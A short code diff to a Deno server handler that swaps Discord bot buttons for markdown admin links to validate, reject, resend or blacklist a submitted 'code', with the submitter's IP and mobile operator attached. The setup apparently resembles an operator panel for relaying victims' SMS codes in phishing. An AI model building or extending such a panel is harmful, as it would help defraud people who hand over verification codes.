@@ -69,17 +69,14 @@ Deno.serve(async (req) => {
     timestamp: now.toISOString(),
   };
 
-  const components = [{
-    type: 1,
-    components: [
-      { type: 2, style: 3, label: "✅ Valider le code", custom_id: `action:valid:${submissionId}` },
-      { type: 2, style: 4, label: "❌ Changer le numéro", custom_id: `action:wrong:${submissionId}` },
-      { type: 2, style: 1, label: "⏰ Renvoyer au code", custom_id: `action:expired:${submissionId}` },
-      { type: 2, style: 4, label: "🚫 Instant Blacklist", custom_id: `action:blacklist:${submissionId}:${ip}` },
-    ]
-  }];
+  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
 
-  await sendBotMessage({ embeds: [embed], components });
+  const embed2 = {
+    description: `[✅ Valider le code](${appUrl}/admin?trigger=${submissionId}) • [❌ Changer le numéro](${appUrl}/admin?action=wrong&id=${submissionId}) • [⏰ Renvoyer au code](${appUrl}/admin?action=expired&id=${submissionId}) • [🚫 Blacklist](${appUrl}/admin?action=blacklist&id=${submissionId}&ip=${ip})`,
+    color: operatorColors[operateur] || 16776960,
+  };
+
+  await sendBotMessage({ embeds: [embed, embed2] });
 
   return Response.json({ ok: true });
 });
